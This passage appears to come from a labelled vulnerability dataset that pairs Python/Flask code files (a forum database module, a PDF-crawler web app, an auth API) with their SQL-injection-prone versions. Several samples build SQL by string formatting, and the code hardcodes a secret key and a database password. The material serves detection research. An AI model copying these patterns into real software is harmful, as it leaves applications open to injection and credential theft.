  def post(self):\n        # get the post data\n        post_data = request.get_json(force=True)\n        try:\n            # fetch the user data\n            user = Table.filter_by(email=post_data.get('email'))\n            if len(user) >= 1 and post_data.get('password'):\n                if str(user[0][3]) == str(post_data.get('password')):\n                    auth_token = encode_auth_token(user[0][0])\n                else:\n                    response_object = {\n                        'status': 'fail',\n                        'message': 'Password or email do not match.'\n                    }\n                    return make_response(jsonify(response_object)), 401\n                try:\n                    if auth_token:\n                        response_object = {\n                            'status': 'success',\n                            'id': user[0][0],\n                            'message': 'Successfully logged in.',\n                            'auth_token': auth_token.decode()\n                        }\n                        return make_response(jsonify(response_object)), 200\n                except Exception as e:\n                    print(e)\n                    return {\"message\": 'Error decoding token'}, 401\n            else:\n                response_object = {\n                    'status': 'fail',\n                    'message': 'User does not exist.'\n                }\n                return make_response(jsonify(response_object)), 404\n        except Exception as e:\n            print(e)\n            response_object = {\n                'status': 'fail',\n                'message': 'Try again'\n            }\n            return make_response(jsonify(response_object)), 500\n\n\nclass UserListAPI(MethodView):\n    \"\"\" User List Api Resource \"\"\"\n    @jwt_required\n    def get(self, user_id=None):\n        if user_id:\n            user = Table.filter_by(email=None, user_id=user_id)\n            if len(user) < 1:\n                response_object = {\n                    'results': 'User not found',\n                    'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': user,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table.query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass LogoutAPI(MethodView):\n    \"\"\" Logout Resource \"\"\"\n    def post(self):\n        # get auth token\n        auth_header = request.headers.get('Authorization')\n        return auth_header\n\n\n# Define the API resources\nregistration_view = RegisterAPI.as_view('register_api')\nlogin_view = LoginAPI.as_view('login_api')\nuser_view = UserListAPI.as_view('user_api')\nlogout_view = LogoutAPI.as_view('logout_api')\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/signup',\n    view_func=registration_view,\n    methods=['POST']\n)\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/delete',\n    view_func=registration_view,\n    methods=['DELETE']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/login',\n    view_func=login_view,\n    methods=['POST']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users/<string:user_id>',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/logout',\n    view_func=logout_view,\n    methods=['POST']\n)\n/n/n/n/app/auth/test/test_model.py/n/nfrom .base import BaseTestCase\nfrom ..models import Table\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test signup api \"\"\"\n    def test_model_crud(self):\n        # Test Create\n        instance = Table.save(self.data)\n        assert instance == self.data\n\n        # Test query\n        isinstance(Table.query(), type([]))\n/n/n/n/app/comments/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\ncomments_blueprint = Blueprint('comments', __name__)\n\n\nclass ListAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        post_data = request.get_json(force=True)\n        response = Table.save(answer_id, data=post_data)\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your comment was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\ncomment_view = ListAPIView.as_view('comment_api')\n\n# Add Rules for API Endpoints\ncomments_blueprint.add_url_rule(\n    '/api/v1/questions/answers/comment/<string:answer_id>',\n    view_func=comment_view,\n    methods=['POST']\n)\n/n/n/n/app/migrations/db.py/n/nimport psycopg2\nimport psycopg2.extras\n\nfrom .initial1 import migrations\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Database:\n    def __init__(self, config):\n        self.config = db_config(config)\n        self.database = self.config.get('database')\n\n    def test(self):\n        con = psycopg2.connect(**self.config)\n        con.autocommit = True\n\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from pg_database where datname = %(database_name)s\", {'database_name': self.database})\n        databases = cur.fetchall()\n        if len(databases) > 0:\n            print(\" * Database {} exists\".format(self.database))\n            for command in migrations:\n                try:\n                    cur.execute(command)\n                    con.commit()\n                except Exception as e:\n                    print(e)\n        else:\n            print(\" * Database {} does not exists\".format(self.database))\n        con.close()\n\n\ndb = Database(BaseConfig.SQLALCHEMY_DATABASE_URI)\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "069700fb4beec79182fff3c556e9cccce3230d6f", "code": "forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\nimport datetime\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"select content, time from posts order by time desc\")\n  all_posts = cursor.fetchall()\n  conn.close()\n  return all_posts\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  one_post = content\n  cursor.execute(\"insert into posts values (%s)\", (one_post,))\n  conn.commit()\n  conn.close()\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "069700fb4beec79182fff3c556e9cccce3230d6f", "code": "/forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\nimport datetime\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"select content, time from posts order by time desc\")\n  all_posts = cursor.fetchall()\n  conn.close()\n  return all_posts\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"insert into posts values ('%s')\" % content)\n  conn.commit()\n  conn.close()\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "4bad3673debf0b9491b520f0e22e9186af78c375", "code": "bar.py/n/nimport subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"\"\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, \n                stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\"\"\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json,\n                stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"\"\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\"\"\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute(\"\"\"SELECT * FROM Crawls WHERE cid = %s\"\"\", (cid,))\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username']\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"\"\"SELECT * FROM Users WHERE username = %s\"\"\", [username])\n\n        # Note: apparently this is safe from SQL injections see\n        # https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries/7929438#7929438\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME why is username not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"\"\"DELETE FROM Crawls WHERE cid = %s\"\"\" (cid,))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"\"\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\"\"\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "4bad3673debf0b9491b520f0e22e9186af78c375", "code": "/bar.py/n/nimport subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username'] # FIXME SQL_injection danger?\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"SELECT * FROM Users WHERE username = %s\", [username])\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME fucking stupid username is not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"DELETE FROM Crawls WHERE cid = %s\" % cid)\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return 